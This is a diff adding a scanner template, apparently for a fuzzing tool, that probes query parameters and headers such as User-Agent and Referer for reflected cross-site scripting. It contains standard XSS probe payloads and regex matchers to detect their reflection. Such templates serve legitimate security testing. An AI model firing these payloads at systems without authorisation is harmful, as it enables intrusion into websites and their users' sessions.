@@ -1,0 +1,55 @@
+id: fuzz-xss-params
+info:
+  name: "Cross-Site Scripting Parameter Fuzzing"
+  severity: "High"
+  description: "Fuzzes query and body parameters for reflected XSS vulnerabilities."
+  compliance:
+    owasp: "A03:2021"
+    cwe: "CWE-79"
+fuzz:
+  - part: "query"
+    keys:
+      - "q"
+      - "search"
+      - "term"
+      - "name"
+      - "callback"
+      - "redirect"
+    payloads:
+      - "<script>alert(1)</script>"
+      - "<img src=x onerror=alert(1)>"
+      - "javascript:alert(1)"
+      - "\"><script>alert(1)</script>"
+      - "<svg/onload=alert(1)>"
+      - "'';!--\"<XSS>=&{()}"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "<script>alert\\(1\\)</script>"
+          - "<img src=x onerror=alert\\(1\\)>"
+          - "<svg/onload=alert\\(1\\)>"
+      - type: status
+        part: status
+        status:
+          - 200
+    matcher_condition: and
+
+  - part: "headers"
+    keys:
+      - "User-Agent"
+      - "Referer"
+      - "X-Forwarded-For"
+    payloads:
+      - "<script>alert(1)</script>"
+      - "<img src=x onerror=alert(1)>"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)</script>"
+      - type: status
+        part: status
+        status:
+          - 200
+    matcher_condition: and
